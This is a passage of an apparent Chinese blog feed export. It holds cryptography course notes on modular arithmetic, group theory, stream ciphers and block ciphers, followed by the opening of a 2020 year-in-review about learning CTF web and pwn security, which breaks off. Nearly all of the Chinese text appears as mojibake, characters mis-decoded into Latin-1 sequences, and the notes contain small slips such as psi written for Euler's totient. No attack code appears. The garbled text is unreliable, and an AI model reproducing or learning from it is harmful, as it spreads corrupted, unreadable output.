title="2.æ¨¡è¿ç®—"></a>2.æ¨¡è¿ç®—</h2><ul><li><p>æ•°è®º</p><ul><li><p>æ˜¯å¯†ç å­¦ç‰¹åˆ«æ˜¯å…¬é’¥å¯†ç å­¦çš„åŸºæœ¬å·¥å…·</p></li><li><p>ç¦»æ•£çš„æ•°å­—é›†åˆ</p></li><li><p>è¿ç®—æ˜¯æ¨¡åŠ ï¼Œæ¨¡å‡ï¼Œé€†è¿ç®—</p></li><li><p>å¯¹æ•´æ•°å’Œå¤šé¡¹å¼è¿›è¡Œæ¨¡è¿ç®—</p></li><li><p>å­—æ¯çš„é€šç”¨è¡¨ç¤ºï¼š</p><ul><li>n: éè´Ÿæ•´æ•°</li><li><p>p: ç´ æ•°</p></li><li><p>Z: æ•´æ•°é›†åˆ</p></li><li>R: å®æ•°é›†åˆ</li><li><p>Q: æœ‰ç†æ•°é›†åˆ</p></li><li><p>$Z_n$ = {0,1,2â€¦n-1}å°äºnçš„éè´Ÿæ•´æ•°é›†åˆ</p></li></ul></li></ul></li><li><p>æ¨¡è¿ç®—</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>åŒä½™</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) ç­‰ä»·a $\equiv$ b mod n</li></ul></li><li><p>åŒä½™æ€§è´¨</p><ul><li>a $\equiv$ b mod nï¼Œåˆ™b $\equiv$ a mod n</li><li>a $\equiv$ b mod nï¼Œb $\equiv$ c mod nï¼Œåˆ™a $\equiv$ c mod n</li><li>a $\equiv$ b mod nï¼Œdï½œnï¼Œåˆ™a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ï¼Œ d = lcm($n_1,n_2,â€¦n_k$)ï¼Œåˆ™a $\equiv$ b mod dï¼Œ(i = 1,2,â€¦,k)</li></ul></li><li><p>åŒä½™ç±»/ç­‰ä»·ç±»/æ¨¡nå‰©ä½™ç±»</p><ul><li>ä¸aæ¨¡nåŒä½™çš„å…¨ä½“æˆä¸ºaçš„åŒä½™ç±»è®°ä¸º$[a]_n$</li><li>$Z_n$ä¸ºæ¨¡nçš„ç­‰ä»·ç±»é›†åˆ</li></ul></li><li><p>ç­‰ä»·ç±»æ€§è´¨</p><ul><li>åœ¨åšmod nçš„åŠ æ³•å’Œä¹˜æ³•æ—¶ï¼Œç­‰ä»·ç±»çš„å…ƒç´ å¯ä»¥æ›¿æ¢ï¼Œç»“æœä¸å˜</li></ul></li><li><p>æ¨¡è¿ç®—æ€§è´¨</p><ul><li>åŠ è¿ç®—å’Œä¹˜è¿ç®—å…ˆåšæ¨¡å’Œååšæ¨¡ä¸å½±å“ç»“æœ</li><li>æ»¡è¶³äº¤æ¢å¾‹ï¼Œç»“åˆå¾‹ï¼Œåˆ†é…å¾‹</li><li>å•ä½å…ƒï¼Œ0æ˜¯åŠ æ³•å•ä½å…ƒï¼Œ1æ˜¯ä¹˜æ³•å•ä½å…ƒ</li></ul></li></ul><h2 id="3-æ¨¡æŒ‡æ•°è¿ç®—"><a href="#3-æ¨¡æŒ‡æ•°è¿ç®—" class="headerlink" title="3.æ¨¡æŒ‡æ•°è¿ç®—"></a>3.æ¨¡æŒ‡æ•°è¿ç®—</h2><p>æ¨¡æŒ‡æ•°è¿ç®—</p><ul><li>$a^m \pmod p$</li><li>æ€è·¯ï¼šç°å°†mç”¨äºŒè¿›åˆ¶è¡¨ç¤º</li><li>ï¼Ÿå¿«é€ŸæŒ‡æ•°è¿ç®—æŸ¥è¯¢</li><li>é˜¶ $ord_n(a)$ï¼Œ æ»¡è¶³ $a^m \equiv $ 1 mod n çš„æœ€å°æ­£æ•´æ•°mä¸ºæ¨¡nä¸‹açš„é˜¶</li><li>$ord_n(a)$ = mï¼Œ$ a^k \equiv 1$ mod nçš„å……è¦æ¡ä»¶æ˜¯kä¸ºmçš„å€æ•°</li></ul><h2 id="4-è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†"><a href="#4-è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†" class="headerlink" title="4.è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†"></a>4.è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†</h2><ul><li>è´¹é©¬å®šç†<ul><li>pæ˜¯ç´ æ•°ï¼Œaæ˜¯æ­£æ•´æ•°ï¼Œä¸”gcd(a,p) = 1,åˆ™$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p æˆ–è€… $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (æ»¡è¶³è´¹é©¬å®šç†ï¼Œå³$2^{12} \equiv 1$ mod 13ï¼Œå³$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-ç´ æ€§æ£€æµ‹"><a href="#5-ç´ æ€§æ£€æµ‹" class="headerlink" title="5.ç´ æ€§æ£€æµ‹"></a>5.ç´ æ€§æ£€æµ‹</h2><p>ç´ æ€§æ£€æµ‹å°±æ˜¯å¯¹ç»™å®šçš„æ•°æ£€éªŒæ˜¯å¦ä¸ºç´ æ•°</p><p>è´¹é©¬å®šç†çš„é€†å‘½é¢˜ä¸æˆç«‹ï¼Œä¼ªç´ æ•°ï¼ˆå¡ç±³æ­‡å°”æ•°ï¼‰</p><ul><li>åŸƒæ‹‰æ‰˜æ–¯æ•£ç­›æ³•</li><li><p>Miller-Rabinæ¦‚ç‡æ£€æµ‹æ³•</p><h2 id="6-æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#6-æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="6.æ¬§å‡ é‡Œå¾—ç®—æ³•"></a>6.æ¬§å‡ é‡Œå¾—ç®—æ³•</h2></li></ul><p>è¾—è½¬ç›¸é™¤æ³•</p><h2 id="7-ä¸­å›½å‰©ä½™å®šç†"><a href="#7-ä¸­å›½å‰©ä½™å®šç†" class="headerlink" title="7.ä¸­å›½å‰©ä½™å®šç†"></a>7.ä¸­å›½å‰©ä½™å®šç†</h2><p>å°æ•°é‡æ„å¤§æ•°</p><p>å¤§æ•°ç”¨å°æ•°è¡¨ç¤º</p><h2 id="8-ç¾¤ç¯åŸŸ"><a href="#8-ç¾¤ç¯åŸŸ" class="headerlink" title="8.ç¾¤ç¯åŸŸ"></a>8.ç¾¤ç¯åŸŸ</h2><ul><li><p>ä»£æ•°ç³»ç»Ÿ</p><ul><li>ä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ç§æ•°å­¦æ¨¡å‹ï¼ŒåŒ…å«è¦å¤„ç†çš„æ•°å­¦å¯¹è±¡çš„é›†åˆåŠé›†åˆä¸Šçš„å…³ç³»æˆ–è¿ç®—ã€‚</li><li>ç¾¤ï¼Œç¯ï¼ŒåŸŸéƒ½æ˜¯ä»£æ•°ç³»ç»Ÿã€‚</li></ul></li><li><p>åŠç¾¤</p><ul><li>ä»»å–abå±äºSï¼Œaå’Œbçš„è¿ç®—*éƒ½åœ¨Sä¸­ï¼Œåˆ™Så¯¹è¿ç®—*æ˜¯å°é—­çš„</li><li>æ»¡è¶³ç»“åˆå¾‹</li><li>æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹ï¼Œç§°ä¸º<G,*>ä¸ºåŠç¾¤</li></ul></li><li><p>ç¾¤</p><ul><li>å°é—­æ€§</li><li>ç»“åˆå¾‹</li><li>å•ä½å…ƒï¼š$a<em>e = e</em>a = a$ï¼Œeç§°ä¸º$<G,*>$çš„å•ä½å…ƒ</li><li>é€†å…ƒï¼šå¯¹ä»»å–aå±äºGï¼Œå­˜åœ¨å…ƒç´ $a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>æ»¡è¶³ä»¥ä¸Šå‡ ç‚¹ç§°ä¸º$<G,*>$æ˜¯ç¾¤</li><li>å®ä¾‹ $<Z_8,+>$ï¼Œæ¨¡8åŠ </li><li>å®ä¾‹ XORï¼Œæ¨¡2åŠ </li><li>å®ä¾‹ï¼ŒåŠ æ³•ç¾¤<ul><li>å¯¹ä»»æ„nå¤§äºç­‰äº1ï¼Œæ•´æ•°æ¨¡nçš„é›†åˆæ„æˆä¸€ä¸ªåŒ…å«nä¸ªå…ƒç´ çš„æœ‰é™æ¨¡nåŠ æ³•ç¾¤ï¼Œå•ä½å…ƒæ˜¯0ï¼Œç¾¤ä¸­ä»»ä¸€å…ƒç´ aï¼Œå®ƒçš„é€†å…ƒæ˜¯n-aï¼Œè¿™ä¸ªç¾¤è®°ä¸º$Z_n$</li></ul></li><li><p>å®ä¾‹ï¼Œä¹˜æ³•ç¾¤ä¸æ˜¯ç¾¤ï¼Œæ˜¯å¹ºåŠç¾¤ï¼Œä¸æ»¡è¶³é€†å…ƒçš„æ¡ä»¶</p></li><li><p>ä¹˜æ³•ç¾¤ $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$ï¼Œå°äºnçš„éè´Ÿæ•´æ•°ä¸”ä¸näº’ç´ </li><li>æ¨¡nä¹˜æ³•ç¾¤ï¼Œå•ä½å…ƒe = 1</li><li>æ˜¯abelç¾¤ï¼Œ$|Z_n^*| = \psi(n)$</li><li>å¯¹ç´ æ•°pï¼Œ$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abelç¾¤</p><ul><li>è¿ç®—*è¡¨ç¤ºåŠ æ³•æ—¶ï¼Œç§°ä¸ºåŠ æ³•ç¾¤</li><li>ä¹˜æ³•ï¼Œä¹˜æ³•ç¾¤</li><li>è‹¥Gçš„å…ƒç´ æ˜¯æœ‰é™çš„ï¼Œç§°ä¸ºæœ‰é™ç¾¤ï¼Œå¦åˆ™ä¸ºæ— é™ç¾¤</li><li>æœ‰é™ç¾¤ä¸­ï¼ŒGçš„å…ƒç´ ä¸ªæ•°ç§°ä¸ºç¾¤Gçš„é˜¶æ•°ï¼Œè¡¨ç¤ºä¸º$|G|$ or $#G$</li><li>è¿˜æ»¡è¶³äº¤æ¢å¾‹ï¼Œåˆ™ç§°ä¸ºç¾¤$<G,*>$ä¸ºAbelç¾¤</li><li><p>å¯†ç å­¦ä¸­ç”¨åˆ°çš„å‡ ä¹éƒ½ä¸ºAbelç¾¤</p></li><li><p>å®ä¾‹ $<Z_8,+>$ï¼Œæ¨¡8åŠ ï¼Œé˜¶ä¸º8</p></li></ul></li></ul><ul><li>å¾ªç¯ç¾¤<ul><li>$g^i = a$ï¼Œaä¸ºä»»æ„çš„ä¸€ä¸ªå…ƒç´ ï¼Œgä¸ºç”Ÿæˆå…ƒæˆ–æœ¬åŸå…ƒ</li><li>å³èƒ½å¤Ÿè‡ªå·±å¯¹è‡ªå·±åšè¿ç®—ï¼Œæœ€ç»ˆèƒ½å¤Ÿéå†ç¾¤</li><li>å®ä¾‹<ul><li>$Z_4$</li><li>$Z_p^*$ï¼Œpä¸ºç´ æ•°ï¼Œè‚¯å®šå­˜åœ¨ç”Ÿæˆå…ƒ<ul><li>å®šç†$Z_n^*$æ¯ä¸€ä¸ªå…ƒç´ éƒ½æœ‰ä¹˜æ³•é€†å…ƒ</li><li>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ç”Ÿæˆå…ƒ</li></ul></li></ul></li><li>æœ¬åŸå…ƒçš„å­˜åœ¨æ€§<ul><li>å¯¹æ¨¡ç´ æ•°p<ul><li><ol><li>å…¶ç”Ÿæˆå…ƒå¿…å®šå­˜åœ¨</li><li>å½“gä¸ºç”Ÿæˆå…ƒä¸”pä¸p-1äº’ç´ æ—¶ï¼Œ$g^a$  mod pä¹Ÿæ˜¯ç”Ÿæˆå…ƒ</li><li>ç”Ÿæˆå…ƒä¸ªæ•°ä¸º$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>å…ƒç´ çš„é˜¶<ul><li>æ‹‰æ ¼æœ—æ—¥å®šç†æ¨è®ºï¼Œæä¾›äº†ç¾¤çš„é˜¶å’Œç¾¤ä¸­å…ƒç´ é˜¶çš„å…³ç³»</li></ul></li></ul><ul><li>ç¯<ul><li>$<R,+>$æ˜¯Abelç¾¤</li><li>$<R,*>$æ˜¯åŠç¾¤</li><li>åˆ†é…å¾‹</li><li>$<R,+,*>$æ˜¯ç¯</li></ul></li></ul><ul><li>åŸŸ<ul><li>$<F,+>$ æ˜¯Abelç¾¤ï¼Œ0æ˜¯+çš„å•ä½å…ƒ</li><li>$<F-0,*>$ æ˜¯Abelç¾¤</li><li>åˆ†é…å¾‹</li><li>$<F,+,*>$æ˜¯åŸŸ</li></ul></li></ul><ul><li>æœ‰é™åŸŸ<ul><li>è‹¥qæ˜¯ç´ æ•°çš„å¹‚ï¼Œå³$q = p^n$ ï¼Œpæ˜¯ç´ æ•°ï¼Œnæ˜¯æ­£æ•´æ•°ï¼Œåˆ™é˜¶ä¸ºqçš„åŸŸè®°ä¸ºGF(q)</li></ul></li></ul><h2 id="9-ç¦»æ•£å¯¹æ•°"><a href="#9-ç¦»æ•£å¯¹æ•°" class="headerlink" title="9.ç¦»æ•£å¯¹æ•°"></a>9.ç¦»æ•£å¯¹æ•°</h2><h2 id="10-å¹³æ–¹å‰©ä½™"><a href="#10-å¹³æ–¹å‰©ä½™" class="headerlink" title="10.å¹³æ–¹å‰©ä½™"></a>10.å¹³æ–¹å‰©ä½™</h2><h2 id="11-å°ç»“"><a href="#11-å°ç»“" class="headerlink" title="11.å°ç»“"></a>11.å°ç»“</h2><h1 id="ä¸‰-åº”ç”¨å¯†ç å­¦"><a href="#ä¸‰-åº”ç”¨å¯†ç å­¦" class="headerlink" title="ä¸‰.åº”ç”¨å¯†ç å­¦"></a>ä¸‰.åº”ç”¨å¯†ç å­¦</h1><h2 id="1-æµå¯†ç "><a href="#1-æµå¯†ç " class="headerlink" title="1.æµå¯†ç "></a>1.æµå¯†ç </h2><p>æµå¯†ç çš„åŸºæœ¬æ€æƒ³ï¼šåˆ©ç”¨å¯†é’¥käº§ç”Ÿä¸€ä¸ªå¯†é’¥æµï¼Œä½¿ç”¨è§„åˆ™å¯¹æ˜æ–‡ä¸²åŠ å¯†</p><p>ä¸ç»´å‰å°¼äºšç±»ä¼¼ï¼Œå¤šè¡¨ä»£æ¢å¯†ç </p><p>å¯†é’¥æµé€šè¿‡å¯†é’¥å‘ç”Ÿå™¨fäº§ç”Ÿ</p><p> $z_i = f(k,\theta_i)$</p><p>åˆ†ç»„å¯†ç å’Œæµå¯†ç çš„åŒºåˆ«åœ¨äºæœ‰æ— è®°å¿†æ€§</p><p>æµå¯†ç çš„æ»šåŠ¨å¯†é’¥ï¼Œç”±å‡½æ•°fï¼Œå¯†é’¥kå’Œåˆå§‹çŠ¶æ€è¥¿æ ¼ç›å®Œå…¨ç¡®å®šã€‚æ­¤åï¼Œè¾“å…¥çš„å¯†æ–‡å¯èƒ½å½±å“åŠ å¯†å™¨ä¸­å†…éƒ¨è®°å¿†å…ƒä»¶çš„å­˜å‚¨çŠ¶æ€ï¼Œå› è€Œå¯èƒ½ä¾èµ–<strong>äºæ‰€æœ‰è¾“å…¥</strong>çš„å½±å“ã€‚</p><p>å¯åˆ†ä¸ºåŒæ­¥å’Œè‡ªåŒæ­¥ä¸¤ç§</p><p>å¯¹ç§°å¯†ç ä½“åˆ¶</p><p>åŒæ­¥æµå¯†ç çš„å˜æ¢$E_i$å¯ä»¥æœ‰å¤šç§é€‰æ‹©ï¼Œåªè¦å˜æ¢å³å¯é€†å³å¯ã€‚</p><p>äºŒå…ƒåŠ æ³•æµå¯†ç æ˜¯æœ€å¸¸ç”¨çš„æµå¯†ç çš„ä½“åˆ¶ã€‚å³å¼‚æˆ–ã€‚</p><p>å¯†é’¥æµåºåˆ—Zåº”è¯¥å…·æœ‰å¦‚ä¸‹æ€§è´¨</p><ul><li>æå¤§çš„å‘¨æœŸ</li><li>è‰¯å¥½çš„ç»Ÿè®¡ç‰¹æ€§</li><li>æŠ—çº¿æ€§åˆ†æ</li><li>æŠ—ç»Ÿè®¡åˆ†æ</li></ul><h3 id="æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº"><a href="#æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº" class="headerlink" title="æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº"></a>æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº</h3><p>æ˜¯å…·æœ‰ç¦»æ•£è¾“å…¥å’Œè¾“å‡ºçš„ä¸€ç§æ•°å­¦æ¨¡å‹ï¼Œç”±ä¸‰éƒ¨åˆ†ç»„æˆ</p><ol><li>æœ‰é™çŠ¶æ€é›†</li><li>æœ‰é™è¾“å…¥å­—ç¬¦é›†ï¼Œæœ‰é™è¾“å‡ºå­—ç¬¦é›†</li><li>è½¬ç§»å‡½æ•°</li></ol><h3 id="å¯†é’¥æµäº§ç”Ÿå™¨"><a href="#å¯†é’¥æµäº§ç”Ÿå™¨" class="headerlink" title="å¯†é’¥æµäº§ç”Ÿå™¨"></a>å¯†é’¥æµäº§ç”Ÿå™¨</h3><p>å…³é”®æ˜¯å¯†é’¥æµäº§ç”Ÿå™¨ã€‚ä¸€èˆ¬å¯å°†å…¶çœ‹æˆä¸ºå‚æ•°ä¸ºkçš„æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼Œæœ‰è¾“å‡ºç¬¦å·é›†ï¼Œä¸€ä¸ªçŠ¶æ€é›†ï¼Œå’Œä¸¤ä¸ªå‡½æ•°ä»¥åŠä¸€ä¸ªåˆå§‹çŠ¶æ€ç»„æˆ</p><p>ä¸¤ä¸ªå‡½æ•°ä¸ºçŠ¶æ€è½¬ç§»å‡½æ•°å’Œå­—ç¬¦è¾“å‡ºå‡½æ•°</p><p>LFSRï¼šçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨</p><p>æœ€å¤§å‘¨æœŸä¸º2çš„næ¬¡æ–¹å‡1ï¼Œnæ˜¯å‡ çº§å¯„å­˜å™¨</p><h2 id="2-åˆ†ç»„å¯†ç ä½“åˆ¶"><a href="#2-åˆ†ç»„å¯†ç ä½“åˆ¶" class="headerlink" title="2.åˆ†ç»„å¯†ç ä½“åˆ¶"></a>2.åˆ†ç»„å¯†ç ä½“åˆ¶</h2><p>å¯¹ç§°å¯†ç ä½“åˆ¶</p><h3 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h3><ul><li><p>åŠ å¯†è§£å¯†</p></li><li><p>æ„æˆå…¶ä»–åŠ å¯†ç®—æ³•çš„ç»„æˆå…ƒç´ </p></li></ul><ul><li>æ˜æ–‡</li><li>æ˜æ–‡åˆ†ç»„</li><li>å¯†é’¥</li><li>å¯†æ–‡åˆ†ç»„</li><li>åŠ å¯†å‡½æ•°</li></ul><p>é€šå¸¸å–å¯†æ–‡åˆ†ç»„æ•°é‡å’Œæ˜æ–‡åˆ†ç»„æ•°é‡ç›¸ç­‰</p><ul><li>è¦æ±‚<ul><li>åˆ†ç»„é•¿åº¦nè¶³å¤Ÿå¤§ï¼Œé˜²æ­¢æ˜æ–‡ç©·ä¸¾æ”»å‡»æ³•</li><li>å¯†é’¥é‡è¶³å¤Ÿå¤§ï¼Œå³ç½®æ¢å­é›†ä¸­çš„å…ƒç´ è¶³å¤Ÿå¤šï¼Œä»¥é˜²æ­¢å¯†é’¥ç©·ä¸¾æ”»å‡»ï¼Œä½†åˆä¸èƒ½è¿‡é•¿ï¼Œç®¡ç†é—®é¢˜</li><li>ç”±å¯†é’¥ç¡®å®šç½®æ¢çš„ç®—æ³•è¦è¶³å¤Ÿå¤æ‚</li><li>åŠ å¯†å’Œè§£å¯†è¿ç®—ç®€å•ï¼Œæ˜“äºè½¯ä»¶å’Œç¡¬ä»¶é«˜é€Ÿå®ç°</li></ul></li></ul><h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2.DES"></a>2.DES</h3><p>å¯†é’¥é•¿åº¦ä¸º56ä½</p><h3 id="3-åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼"><a href="#3-åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼" class="headerlink" title="3.åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼"></a>3.åˆ†ç»„å¯†ç ä½“åˆ¶çš„è¿è¡Œæ¨¡å¼</h3><h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><h3 id="5-AES"><a href="#5-AES" class="headerlink" title="5.AES"></a>5.AES</h3>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¡å†…è¯¾ç¨‹ç¬”è®° </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´åº¦æ€»ç»“</title>
      <link href="2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-3æœˆ"><a href="#1-3æœˆ" class="headerlink" title="1-3æœˆ"></a>1-3æœˆ</h2><p>1-3æœˆå•¥ä¹Ÿä¸ä¼šï¼Œé“fwç½¢äº†ï¼Œåœ¨å­¦æ ¡æ‘¸æ‘¸é±¼ï¼Œç”µå­äººï¼Œç”µè„‘å°ç™½-.-</p><h2 id="3æœˆ"><a href="#3æœˆ" class="headerlink" title="3æœˆ"></a>3æœˆ</h2><p>æ¥è§¦ç½‘ç»œå®‰å…¨æºäºä¸€ä¸ªç”µå½±ï¼ŒæŒºæ„Ÿå…´è¶£çš„ï¼Œåœ¨å…¨ç½‘æœç´¢ç›¸å…³æ–‡çŒ®èµ„æ–™å•¥çš„ï¼Œä¹Ÿå•¥ä¹Ÿä¸ä¼šï¼Œåæ¥å‘ç°ctfæ¯”èµ›ï¼Œæƒ³ç€å­¦å­¦å§ï¼Œä»webå®‰å…¨å¼€å§‹äº†ï¼Œè®°å¾—ä¸€å¼€å§‹æ˜¯å¬çš„å“”å“©å“”å“©è¯¾ç¨‹ï¼Œä»€ä¹ˆä»å…¥é—¨åˆ°å…¥ç‹±å•¥çš„ï¼Œå¸ˆå‚…å…¶å®è®²çš„å¾ˆå¥½ï¼Œé‚£ä¸ªæ—¶å€™å­¦ä¼šäº†sqlæ³¨å…¥ï¼Œxsså•¥çš„ï¼Œä¸è¿‡åªçŸ¥é“åŸç†ï¼Œå¹¶ä¸ä¼šç›¸å…³æ“ä½œã€‚<br>åæ¥å‘ç°ä¸€ä¸ªç½‘ç«™å«bugkuï¼Œå¼€å§‹åˆ·é¢˜äº†ï¼Œä¸€å¼€å§‹è¿‡ç¨‹æ˜¯è‡ªé—­çš„ï¼Œä»€ä¹ˆf12éƒ½ä¸ä¼šï¼Œç„¶åå¼€å§‹é™†é™†ç»­ç»­å­¦JavaScriptå‰ç«¯å•¥çš„ï¼Œphpå’Œmysqlä¹Ÿç®€å•å­¦å­¦ï¼Œåæ¥é¢å‘wpåšé¢˜æœ‰äº†ä¸€ç‚¹ç‚¹æ„Ÿè§‰ã€‚</p><h2 id="4-5æœˆ"><a href="#4-5æœˆ" class="headerlink" title="4-5æœˆ"></a>4-5æœˆ</h2><p>ç”±äºç–«æƒ…çš„çˆ†å‘æ²¡æœ‰å¼€å­¦ï¼Œä¸Šç½‘è¯¾ï¼Œå°±å¾ˆniceï¼Œç„¶åå°±ä¸å¬è¯¾ï¼Œå¼€å§‹ç–¯ç‹‚è‡ªå­¦åšé¢˜ï¼Œå½“æ—¶å•¥éƒ½å­¦æ—©6ç‚¹åˆ°æ™š12ç‚¹å·¦å³ï¼Œpython php JavaScript linux â€¦â€¦ åæ­£å°±æ˜¯ä»€ä¹ˆéƒ½ä¼šä¸€ç‚¹ä½†æ˜¯ä¸ç²¾ç»†ã€‚<br>åæ¥æ‰“æ¯”èµ›ï¼Œç›´æ¥è‡ªé—­äº†ï¼Œè®¤è¯†äº†å †å †å¸ˆå‚…ï¼Œå½“æ—¶å †å †å¸ˆå‚…ä¸»æ–¹å‘æ˜¯webå‰¯æ–¹å‘æ˜¯pwnï¼Œå¾ˆç¾¡æ…•ï¼Œå¤ªç¾¡æ…•pwnğŸ‘´ğŸ‘´äº†ï¼Œç„¶åå †å †å‘Šè¯‰æˆ‘ä¸€ä¸ªç½‘ç«™å«buuojï¼Œè®©æˆ‘å¼€å§‹åšé‚£ä¸ªä¸œè¥¿ï¼Œç„¶åå°±å¼€å§‹å…¥å‘buuäº†ï¼Œè®°å¾—ç¬¬ä¸€é“é¢˜å¥½åƒæ˜¯ç›®å½•ç©¿è¶Šè¿˜æ˜¯ååºåˆ—åŒ–ä¸å¤ªè®°å¾—äº†ï¼Œä»ç™½å¤©ä¸€ç›´åšåˆ°å‡Œæ™¨ï¼Œå„ç§æŠ„wpå¤ç°ï¼Œæ‰“å‡»å¤ªå¤§äº†ï¼Œç„¶åå †å †å¸ˆå‚…å‡Œæ™¨4ç‚¹å¤šæ•™æˆ‘æ€ä¹ˆåšå‘œå‘œå‘œå¤ªæ„ŸåŠ¨äº†ï¼Œç„¶åå‘Šè¯‰æˆ‘è¯´æå®¢å¤§æŒ‘æˆ˜ç³»åˆ—çš„é¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œæˆ‘å°±å¼€å§‹æŒ‘ç®€å•é¢˜åšã€‚ç„¶åä»å“”å“©å“”å“©ç–¯ç‹‚å¬è¯¾ï¼Œåæ¥å­¦äº†ä¸¤å‘¨miscï¼Œåœ¨MRCTFæ–°ç”Ÿèµ›ä¸Šå‡ºäº†ä¸€ä¸¤ä¸ªwebå’Œå››äº”é“miscï¼Œå¤ªæ»¡è¶³äº†ï¼Œç¬¬ä¸€æ¬¡æ‰¾åˆ°æˆå°±æ„Ÿï¼Œç„¶ååæ¥ä¸€ä¸ªå•¥æ¯”èµ›åˆæ•´è‡ªé—­äº†ã€‚ç„¶åè¿›å…¥è¿·èŒ«æœŸã€‚ä¸­é—´æˆ‘å¸®ä¸ƒæ˜Ÿå¸ˆå‚…äº†å½•äº†ä¸€æœŸé•¿äº­ç§‘æŠ€å¸ˆå‚…åšçš„pwnè¯¾ç¨‹ï¼Œé‚£æ˜¯ä»€ä¹ˆé¬¼å•Šä»å¤´åˆ°å°¾å…¨ç¨‹æ‡µé€¼ï¼Œå°±ç¡¬ç”Ÿç”Ÿç»™ğŸ‘´å¬ç¡ç€äº†ã€‚</p><h2 id="6-7æœˆ"><a href="#6-7æœˆ" class="headerlink" title="6-7æœˆ"></a>6-7æœˆ</h2><p>ä¸‹å­¦æœŸå¿«è€ƒè¯•äº†ï¼Œç„¶åè½¬ä¸“ä¸šå•¥çš„ï¼Œç”±äºä¸Šå­¦æœŸæˆç»©è¿˜å¯ä»¥ï¼Œç„¶åå°±æƒ³ç€è½¬ä¸ªä¸“ä¸š8ï¼Œæœ¬æ¥æ˜¯æƒ³é€‰ç½‘å®‰çš„ï¼Œä½†æ˜¯ç«Ÿç„¶ä¸èƒ½è½¬å› ä¸ºæ˜¯æ–°å¼€çš„ä¸“ä¸šå•Šå¯æ¶ï¼Œç„¶ååˆæƒ³è½¬è®¡ç§‘ï¼Œä½†æ˜¯çœ‹åˆ°äººæ‰åŸ¹å…»æ–¹æ¡ˆå‘ç°ç½‘ç»œä¸“ä¸šç«Ÿç„¶æœ‰å®‰å…¨è¯¾äºæ˜¯æ¥åˆ°äº†ç½‘ç»œä¸“ä¸šï¼Œåè¯äº†ï¼ˆ<br>ç„¶åå¿«è€ƒè¯•äº†ï¼Œå•¥ä¹Ÿæ²¡å­¦è¿™å­¦æœŸï¼Œå¼€å§‹ç–¯ç‹‚è¡¥è¯¾ï¼Œç”µè·¯ä»ç¬¬ä¸‰ç« ğŸ‘´å°±æ²¡å¬æ‡‚è¿‡ï¼ŒçŒ´åšå£«yydsï¼Œé«˜æ•°äºŒè¾¹å¬è¯¾è¾¹ç©æ¸¸æˆï¼Œé«˜æ•°å”yydsã€‚æœ€ç»ˆéƒ½è€ƒçš„è¿˜è¡Œã€‚ç„¶åwebæ–¹å‘é¢ä¸´ç“¶é¢ˆäº†ï¼Œå¼€å§‹è¿‡æ¸¡pwnã€‚<br>æ²¡æœ‰è¯¾ç¨‹ï¼Œä»æ±‡ç¼–å¼€å§‹å­¦ï¼Œè´¼ç—›è‹¦ï¼Œæ™šä¸Šåšæ¢¦éƒ½æ˜¯å™©æ¢¦ã€‚åæ­£é‚£æ®µæ—¶é—´æŒºéš¾å—çš„ã€‚<br>ç”¨äº†ä¸€æ®µæ—¶é—´æŠŠwikiä¸Šçš„å¤§éƒ¨åˆ†æ ˆçŸ¥è¯†ç‚¹æå®šä¹‹åå¼€å§‹å†²åˆºå †éƒ¨åˆ†ã€‚<br>æ€ä¹ˆè¯´å‘¢ï¼Œå †éƒ¨åˆ†åˆšå¼€å§‹å¯¹äºğŸ‘´æ¥è¯´ç®€ç›´æ˜¯åœ°ç‹±ã€‚æ²¡æœ‰å­¦è¿‡æ•°æ®ç»“æ„ï¼Œæ–‡çŒ®çœ‹ä¸æ‡‚ï¼Œåˆæ²¡æœ‰è§†é¢‘èµ„æ–™ï¼Œä¸ƒæ˜Ÿå¸ˆå‚…ç¾¤é‡Œä¹Ÿæ²¡æœ‰pwnæ‰‹ï¼Œå°±å¾ˆéš¾å—ï¼Œå½“æ—¶æ˜Ÿç›Ÿçš„ä¸€ä¸ªå¸ˆå‚…å‡ºäº†ä¸€å¥—pwnè¯¾ç¨‹ï¼Œå 